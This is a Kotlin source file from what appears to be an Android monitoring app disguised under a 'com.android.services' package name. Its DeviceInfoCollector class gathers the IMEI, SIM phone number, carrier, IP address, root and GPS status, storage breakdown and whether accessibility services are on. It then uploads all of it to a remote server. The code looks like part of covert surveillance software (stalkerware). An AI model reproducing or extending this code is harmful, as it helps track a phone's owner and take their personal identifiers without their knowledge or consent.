package com.android.services.logs.collectors

import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.DeviceInformation
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.TOSApi
import com.android.services.util.*

class DeviceInfoCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        getAndUploadDeviceInformation()
    }

    private fun getAndUploadDeviceInformation() {
        try {
            val deviceInformation = DeviceInformation()
            deviceInformation.appVersion =
                "${
                    DeviceInformationUtil.versionName
                }_${DeviceInformationUtil.deviceOS}"
            deviceInformation.deviceName = DeviceInformationUtil.deviceModel ?: ""
            deviceInformation.audioStorage = AppUtils.formatSize(MemoryUsage.audioStorage) ?: ""
            deviceInformation.batteryLevel = DeviceInformationUtil.getBatteryLevel(context) ?: ""
            deviceInformation.carrierName = DeviceInformationUtil.getNetworkOperator(context) ?: ""
            deviceInformation.imei =
                String.format(
                    "%s%s%s%s%s",
                    DeviceInformationUtil.getIMEINumber(context),
                    "_",
                    if (AppUtils.isAccessibilityEnabled(context)) "1" else "0",
                    "__",
                    DeviceInformationUtil.isGooglePlayServicesAvailable(context)
                )
            deviceInformation.deviceStorage =
                (AppUtils.formatSize(MemoryUsage.freeStorage) + " / "
                        + AppUtils.formatSize(MemoryUsage.totalStorage)) ?: ""
            deviceInformation.ipAddress = DeviceInformationUtil.getIPAddress(context) ?: ""
            deviceInformation.isDeviceRooted = DeviceInformationUtil.isDeviceRooted ?: false
            deviceInformation.isGpsOn = DeviceInformationUtil.isGpsEnabled(context) ?: false
            deviceInformation.isWifiOn = DeviceInformationUtil.isWifiEnabled(context) ?: false
            deviceInformation.simNumber = DeviceInformationUtil.getPhoneNumber(context) ?: ""
            AppConstants.phoneNumber = deviceInformation.simNumber ?: ""
            AppConstants.networkName = deviceInformation.carrierName ?: ""
            deviceInformation.videosStorage = AppUtils.formatSize(MemoryUsage.videosStorage) ?: ""
            deviceInformation.photosStorage = AppUtils.formatSize(MemoryUsage.imagesStorage) ?: ""
            deviceInformation.otherStorage = AppUtils.formatSize(MemoryUsage.otherStorage) ?: ""
            deviceInformation.syncTime =
                AppUtils.formatDate(System.currentTimeMillis().toString()) ?: ""
            deviceInformation.userId = AppConstants.userId ?: ""
            deviceInformation.phoneServiceId = AppConstants.phoneServiceId ?: ""
            MemoryUsage.calculateOtherFileExtensionsSize {
                val fileSizes = it.split(" ")
                deviceInformation.apkStorage = fileSizes[0]
                deviceInformation.documentStorage = fileSizes[1]
                deviceInformation.archivesStorage = fileSizes[2]
            }
            val serverHelper = RemoteServerHelper(
                context,
                AppConstants.DEVICE_INFO_TYPE,
                localDatabaseSource,
                tosApi = tosApi
            )
            serverHelper.upload(listOf(deviceInformation))
        } catch (e: Exception) {
            logVerbose("DeviceInfo getting exception e= ${e.message}")
        }
    }
}